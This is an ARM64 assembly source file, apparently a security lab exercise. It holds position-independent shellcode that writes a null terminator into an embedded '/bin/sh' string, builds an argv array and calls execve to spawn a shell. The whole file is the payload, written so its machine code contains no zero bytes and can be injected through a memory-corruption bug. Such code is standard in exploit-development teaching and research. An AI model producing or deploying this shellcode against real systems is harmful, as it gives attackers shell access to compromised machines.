
.section .text
.global _start

_start:
    adr x11, #0x2064    // x11 = PC + 0x2020 + 0x44
    mov x12, #0x2020 
    sub x19, x11, x12   // x19 = PC + 0x44

    mov  x9, 2008
    sub  x8, x9, 2001    // x8 = 7 (the offset of the * in "/bin/sh*")
    strb wzr, [x19, x8]  // Null-terminate the "/bin/sh" string (wzr is the 0 register)

store_args:    
    mov x8,  8 
    str x19, [x19, x8]    // save x19 to argv[0]
    mov x8,  16 
    str xzr, [x19, x8]    // save 0 to argv[1]
    
execve: 
    mov  x0, x19         // x0 = command string ("/bin/sh")

    adds x11, x19, 88    // x11 = x19 + 88
    mov  x12, 80         // x12 = 80
    sub  x1,  x11, x12   // x1  = x11 - x12 = x19 + 8

    mov  x2, xzr         // x2 = 0; xzr is the zero register
    mov  x8, #221        // 221 is execve's system call number
    svc  #0x1337         // Invoke execve()

two:
    .ascii "/bin/sh*"    // offset = 0;  offset of * is 7
    .space 8, 0xAA   // Placeholder for argv[0]: for address to "/bin/sh"
    .space 8, 0xBB   // Placeholder for argv[1]: 0

